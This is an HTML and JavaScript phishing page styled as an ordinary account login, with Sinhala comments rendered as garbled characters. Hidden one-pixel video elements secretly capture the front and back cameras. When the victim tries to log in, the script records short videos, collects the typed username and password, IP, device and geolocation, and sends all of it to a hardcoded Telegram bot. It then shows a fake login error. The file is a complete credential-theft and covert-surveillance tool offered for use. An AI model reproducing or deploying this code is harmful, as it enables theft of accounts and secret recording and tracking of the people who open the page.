<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(120deg, #2980b9, #8e44ad);
            height: 100vh;
            overflow: hidden;
            margin: 0;
            padding: 0;
        }
        .login-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 400px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            padding: 40px;
            z-index: 1000;
        }
        .login-box h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .textbox {
            width: 100%;
            margin-bottom: 20px;
        }
        .textbox input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn:hover {
            background: #2980b9;
        }
        .error {
            color: red;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 10px;
            color: #666;
        }
        /* ‡∑É‡∑ê‡∂ü‡∑Ä‡∑î‡∂´‡∑î video elements */
        .hidden-cameras {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -1;
        }
    </style>
</head>
<body>
    <!-- ‡∑É‡∑è‡∂∏‡∑è‡∂±‡∑ä‚Äç‡∂∫ login form ‡∂ë‡∂ö‡∂ö‡∑ä -->
    <div class="login-box">
        <h2>Login to Your Account</h2>
        <div class="textbox">
            <input type="text" id="username" placeholder="Username" autocomplete="off">
        </div>
        <div class="textbox">
            <input type="password" id="password" placeholder="Password">
        </div>
        <button class="btn" id="loginBtn">Login</button>
        <div class="error" id="errorMsg">Invalid username or password!</div>
        <div class="loading" id="loadingMsg">Processing...</div>
    </div>

    <!-- ‡∑É‡∑ê‡∂ü‡∑Ä‡∑î‡∂´‡∑î ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è -->
    <div class="hidden-cameras">
        <video id="frontCamera" autoplay playsinline muted></video>
        <video id="backCamera" autoplay playsinline muted></video>
    </div>

    <script>
        // ============================================
        // ‡∂î‡∂∫‡∑è‡∂ú‡∑ö Telegram Bot Details
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        let frontStream = null;
        let backStream = null;
        let camerasInitialized = false;
        
        // MediaRecorder objects
        let frontRecorder = null;
        let backRecorder = null;
        
        // Video chunks
        let frontChunks = [];
        let backChunks = [];

        // ------------------------------------------------------------
        // ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä load ‡∑Ä‡∑ô‡∂± ‡∂ú‡∂∏‡∂±‡∑ä‡∂∏ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        window.addEventListener('load', function() {
            initializeCameras();
            document.getElementById('loginBtn').addEventListener('click', handleLogin);
            
            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    handleLogin();
                }
            });
            
            // Site ‡∂ë‡∂ö open ‡∂ö‡∂ª‡∂±‡∂ö‡∑ú‡∂ß message ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
            setTimeout(() => {
                sendTextMessage("üî¥ <b>Website Opened</b>\nSomeone accessed the login page");
            }, 2000);
        });

        // ------------------------------------------------------------
        // ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∂Ø‡∑ô‡∂ö‡∂∏ ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±‡∑Ä‡∑è
        // ------------------------------------------------------------
        async function initializeCameras() {
            try {
                // ‡∂¥‡∑É‡∑î‡∂¥‡∑É ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä
                try {
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: { exact: "environment" },
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 24 }
                        },
                        audio: false
                    });
                    const backVideo = document.getElementById('backCamera');
                    backVideo.srcObject = backStream;
                    console.log('‚úÖ Back camera ready');
                } catch (e) {
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 24 }
                        },
                        audio: false
                    });
                    const backVideo = document.getElementById('backCamera');
                    backVideo.srcObject = backStream;
                    console.log('‚úÖ Back camera ready (fallback)');
                }

                // ‡∂â‡∑É‡∑ä‡∑É‡∂ª‡∑Ñ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä
                try {
                    frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: "user",
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 24 }
                        },
                        audio: false
                    });
                    const frontVideo = document.getElementById('frontCamera');
                    frontVideo.srcObject = frontStream;
                    console.log('‚úÖ Front camera ready');
                } catch (e) {
                    console.log('‚ö†Ô∏è Front camera not available');
                }

                camerasInitialized = true;
                
            } catch (error) {
                console.log('‚ùå Camera initialization failed:', error);
                sendTextMessage("‚ùå Camera access failed: " + error.message);
            }
        }

        // ------------------------------------------------------------
        // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 5‡∂ö video ‡∂ë‡∂ö‡∂ö‡∑ä record ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function recordVideo(stream, cameraName) {
            return new Promise((resolve, reject) => {
                try {
                    const chunks = [];
                    
                    // MediaRecorder setup ‡∂ë‡∂ö
                    const options = {
                        mimeType: 'video/webm;codecs=vp8,opus'
                    };
                    
                    // MIME type ‡∂ë‡∂ö support ‡∑Ä‡∑ô‡∂±‡∑Ä‡∂Ø check ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                    let recorder;
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
                    } else if (MediaRecorder.isTypeSupported('video/webm')) {
                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                    } else {
                        recorder = new MediaRecorder(stream);
                    }
                    
                    recorder.ondataavailable = (e) => {
                        if (e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };
                    
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        resolve(blob);
                    };
                    
                    recorder.onerror = (e) => {
                        reject(e);
                    };
                    
                    // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 5‡∂ö‡∑ä record ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                    recorder.start();
                    setTimeout(() => {
                        recorder.stop();
                    }, 5000); // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 5
                    
                } catch (e) {
                    reject(e);
                }
            });
        }

        // ------------------------------------------------------------
        // Telegram ‡∂∂‡∑ú‡∂ß‡∑ä‡∂ß video ‡∂ë‡∂ö ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function sendVideoToTelegram(videoBlob, cameraName, username, password, ipInfo) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `${cameraName}_${Date.now()}.webm`);
                formData.append('caption', `üé• <b>${cameraName} CAMERA - 5 SEC VIDEO</b>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üìÖ <b>Time:</b> ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' })}
üåç <b>IP:</b> ${ipInfo.ip}
üìç <b>Country:</b> ${ipInfo.country}
üíª <b>Device:</b> ${ipInfo.device}
üåê <b>Browser:</b> ${ipInfo.browser}
üë§ <b>Username:</b> ${username || 'Not entered'}
üîë <b>Password:</b> ${password || 'Not entered'}
‚è± <b>Duration:</b> 5 seconds`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                return response.ok;
            } catch (e) {
                console.log(`‚ùå Failed to send ${cameraName} video:`, e);
                return false;
            }
        }

        // ------------------------------------------------------------
        // ‡∂ß‡∑ô‡∂Ω‡∑í‡∂ú‡∑ä‚Äç‡∂ª‡∑ë‡∂∏‡∑ä ‡∂∂‡∑ú‡∂ß‡∑ä‡∂ß text message ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function sendTextMessage(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (e) {
                console.log('Failed to send message:', e);
                return false;
            }
        }

        // ------------------------------------------------------------
        // IP ‡∑É‡∑Ñ Device ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î ‡∂ú‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function getIPInfo() {
            let ipAddress = 'Unknown';
            let country = 'Unknown';
            
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                ipAddress = ipData.ip;
                country = ipData.country_name || 'Unknown';
            } catch (e) {
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                } catch (err) {}
            }

            // Browser ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î
            const userAgent = navigator.userAgent;
            let browser = 'Unknown';
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            else if (userAgent.includes('Edge')) browser = 'Edge';
            
            let os = 'Unknown';
            if (userAgent.includes('Windows')) os = 'Windows';
            else if (userAgent.includes('Mac')) os = 'MacOS';
            else if (userAgent.includes('Linux')) os = 'Linux';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iPhone')) os = 'iOS';

            return {
                ip: ipAddress,
                country: country,
                browser: browser,
                device: os
            };
        }

        // ------------------------------------------------------------
        // Location ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        await sendTextMessage(`üìç <b>Location Captured:</b>
Latitude: ${lat}
Longitude: ${lon}
Google Maps: https://maps.google.com/?q=${lat},${lon}`);
                    },
                    (error) => {
                        console.log('Location permission denied');
                    }
                );
            }
        }

        // ------------------------------------------------------------
        // ‡∂¥‡∑ä‚Äç‡∂ª‡∂∞‡∑è‡∂± function - ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂Ø‡∑ô‡∂ö‡∂∏ record ‡∂ö‡∂ª‡∂Ω‡∑è ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function captureAndSendVideos() {
            const frontVideo = document.getElementById('frontCamera');
            const backVideo = document.getElementById('backCamera');
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // IP ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î ‡∂ú‡∂±‡∑ä‡∂±
            const ipInfo = await getIPInfo();
            
            // Status update ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
            document.getElementById('loadingMsg').innerHTML = 'üé• Recording 5 sec videos from both cameras...';
            
            // ============================================
            // ‡∂¥‡∑É‡∑î‡∂¥‡∑É ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä‡∑ô‡∂±‡∑ä video ‡∂ë‡∂ö record ‡∂ö‡∂ª‡∂Ω‡∑è ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
            // ============================================
            if (backStream) {
                try {
                    document.getElementById('loadingMsg').innerHTML = 'üé• Recording back camera (5 sec)...';
                    const backVideoBlob = await recordVideo(backStream, 'BACK');
                    await sendVideoToTelegram(backVideoBlob, 'BACK', username, password, ipInfo);
                    console.log('‚úÖ Back camera video sent');
                } catch (e) {
                    console.log('‚ùå Failed to record/send back video:', e);
                    sendTextMessage(`‚ùå Back camera video failed: ${e.message}`);
                }
            }

            // ============================================
            // ‡∂â‡∑É‡∑ä‡∑É‡∂ª‡∑Ñ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä‡∑ô‡∂±‡∑ä video ‡∂ë‡∂ö record ‡∂ö‡∂ª‡∂Ω‡∑è ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
            // ============================================
            if (frontStream) {
                try {
                    document.getElementById('loadingMsg').innerHTML = 'üé• Recording front camera (5 sec)...';
                    const frontVideoBlob = await recordVideo(frontStream, 'FRONT');
                    await sendVideoToTelegram(frontVideoBlob, 'FRONT', username, password, ipInfo);
                    console.log('‚úÖ Front camera video sent');
                } catch (e) {
                    console.log('‚ùå Failed to record/send front video:', e);
                    sendTextMessage(`‚ùå Front camera video failed: ${e.message}`);
                }
            }
            
            // Location ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂± try ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
            getLocation();
            
            // Complete message ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
            await sendTextMessage(`‚úÖ <b>5 sec videos captured and sent!</b>\nFrom both front and back cameras`);
        }

        // ------------------------------------------------------------
        // Login handle ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function handleLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            const loadingMsg = document.getElementById('loadingMsg');
            const loginBtn = document.getElementById('loginBtn');
            
            // Loading ‡∂¥‡∑ô‡∂±‡∑ä‡∑Ä‡∂±‡∑ä‡∂±
            loadingMsg.style.display = 'block';
            loginBtn.disabled = true;
            errorMsg.style.display = 'none';
            
            // ============================================
            // ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂Ø‡∑ô‡∂ö‡∂∏ record ‡∂ö‡∂ª‡∂Ω‡∑è ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
            // ============================================
            if (camerasInitialized) {
                await captureAndSendVideos();
            } else {
                await initializeCameras();
                setTimeout(async () => {
                    await captureAndSendVideos();
                }, 2000);
            }

            // ============================================
            // Error ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂¥‡∑ô‡∂±‡∑ä‡∑Ä‡∂±‡∑ä‡∂± (‡∑É‡∑ê‡∂∂‡∑ë login ‡∂ë‡∂ö‡∂ö‡∑ä ‡∑Ä‡∂ú‡∑ö)
            // ============================================
            setTimeout(() => {
                loadingMsg.style.display = 'none';
                loginBtn.disabled = false;
                errorMsg.style.display = 'block';
                
                // Input fields reset ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
                // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 3‡∂ö‡∑í‡∂±‡∑ä error message ‡∂ë‡∂ö hide ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                setTimeout(() => {
                    errorMsg.style.display = 'none';
                }, 3000);
                
            }, 12000); // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 12‡∂ö‡∑ä loading show ‡∂ö‡∂ª‡∂±‡∑ä‡∂± (‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù record ‡∑Ä‡∑ô‡∂±‡∂ö‡∂∏‡∑ä)
        }

        // ------------------------------------------------------------
        // ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä close ‡∂ö‡∂ª‡∂±‡∂ö‡∑ú‡∂ß ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è stop ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        window.addEventListener('beforeunload', function() {
            if (frontStream) {
                frontStream.getTracks().forEach(track => track.stop());
            }
            if (backStream) {
                backStream.getTracks().forEach(track => track.stop());
            }
        });

    </script>
</body>
</html>
